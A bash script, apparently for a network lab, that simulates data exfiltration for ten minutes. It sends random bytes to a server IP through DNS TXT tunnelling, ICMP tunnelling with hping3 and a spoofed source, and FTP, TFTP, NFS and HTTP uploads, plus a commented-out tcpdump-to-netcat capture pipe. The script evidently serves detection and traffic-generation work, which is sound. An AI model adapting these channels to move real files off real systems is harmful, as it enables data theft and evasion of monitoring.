#!/usr/bin/env bash
#
# exfil_victim_random.sh – Simulates exfiltration (600s) from VMX
# ▶ Usage: sudo ./exfil_victim_random.sh <SERVER_IP>
#

#sudo tcpdump -U -i enp0s3 -s0 -w - \
#  "(arp or tcp or udp) and net 192.168.56.0/24 \
#     and not host 192.168.56.107 and not port 9999" \
#  | nc -q 0 192.168.56.107 9999


set -e

if [[ $EUID -ne 0 ]]; then
  echo "RUN WITH sudo" >&2
  exit 1
fi

SERVER=${1:-192.168.56.250}
IFACE=enp0s3

echo "== Installing dependencies =="
apt update
apt install -y \
  dnsutils \
  hping3 \
  curl \
  ftp \
  tftp-hpa \
  nfs-common \
  netcat-openbsd \
  xxd

# NFS Mount point
MNT="/mnt/exf_nfs"
mkdir -p "$MNT"

techs=(dns_tunnel icmp_tunnel ftp_upload tftp_upload nfs_copy http_upload)

echo "=== Exfil simulation (600s) → $SERVER ==="
END=$((SECONDS + 600))

while (( SECONDS < END )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  ts=$(date +%T)
  LEN=$((512 + RANDOM % 1537))
  TMP="/tmp/exf_${tech}_$RANDOM.bin"
  head -c "$LEN" /dev/urandom > "$TMP"
  printf "[%s] %s → %d bytes\n" "$ts" "$tech" "$LEN"

  case "$tech" in
    dns_tunnel)
      HEX=$(xxd -p "$TMP" | fold -w32 | head -n1)
      dig @"$SERVER" TXT "${HEX}.exf.example.com" +time=1 +tries=1 >/dev/null
      ;;
    icmp_tunnel)
      SRC=$(hostname -I | awk '{print $1}')
      hping3 -1 -c1 -d "$LEN" --spoof "$SRC" \
             -E "$TMP" -I "$IFACE" "$SERVER" >/dev/null
      ;;
    ftp_upload)
      ftp -n "$SERVER" >/dev/null <<EOF
user anonymous ""
put $TMP
quit
EOF
      ;;
    tftp_upload)
      echo "put $TMP" | tftp -p -l "$TMP" -r "$(basename "$TMP")" "$SERVER" >/dev/null
      ;;
    nfs_copy)
      mount -o nolock "${SERVER}:/export" "$MNT" 2>/dev/null || true
      cp "$TMP" "$MNT"/
      umount "$MNT" 2>/dev/null || true
      ;;
    http_upload)
      curl -s --interface "$IFACE" \
           -X POST --data-binary @"$TMP" \
           "http://$SERVER:9092/" --max-time 3 >/dev/null
      ;;
  esac

  rm -f "$TMP"
  # max 6 bg jobs
  while (( $(jobs -r | wc -l) > 6 )); do sleep 0.2; done
  # pause 0.1–0.5 s
  sleep $(awk -v m=0.1 -v M=0.5 'BEGIN{srand(); printf "%.2f", m+rand()*(M-m)}')
done

echo "=== Simulated exfil finished ==="
